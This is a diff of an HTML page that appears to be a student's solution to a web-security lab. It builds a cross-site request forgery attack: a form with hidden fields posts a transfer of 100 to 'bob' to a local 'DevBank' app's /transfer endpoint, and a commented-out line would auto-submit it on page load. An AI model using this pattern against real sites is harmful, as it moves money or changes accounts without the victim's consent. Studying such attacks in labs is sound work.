@@ -1,27 +1,24 @@
+<!-- Host site on temp server; local file has a `null` origin which runs into cors -->
+<!-- python3 -m http.server 8000 -->
+<!-- http://localhost:8000/6c_page.html -->
+
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Attacker page</h1>
-
-    <button id="csrf_btn">Trigger request</button>
+    <h1>CSRF Site</h1>
+    <!-- Use form; default cors policy is blocking js fetch -->
+    <form id="csrf-form" action="http://localhost:5000/transfer" method="POST">
+        <!-- Due to app implementation, needs a valid account; assume bob is attacker -->
+        <!-- Hide values for form inputs, leave submit button -->
+        <input type="hidden" name="to" value="bob">
+        <input type="hidden" name="amount" value="100">
+        <button type="submit">CSRF request</button>
+    </form>
 
     <script>
-        document.getElementById("csrf_btn").addEventListener("click", () => {
-            // TODO: add req js
-            // Submit a cross-origin request to the DevBank state-changing endpoint.
-            
-            fetch("/transfer", {
-                method: "POST",
-                credentials: "include",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: {
-                    to: "bob",
-                    amount: "100"
-                }
-            });
-        });
+        // Attach script to auto-submit when loading site
+        // Disabled for showcase (but does work)
+        // document.getElementById("csrf-form").submit()
     </script>
 </body>
 </html>
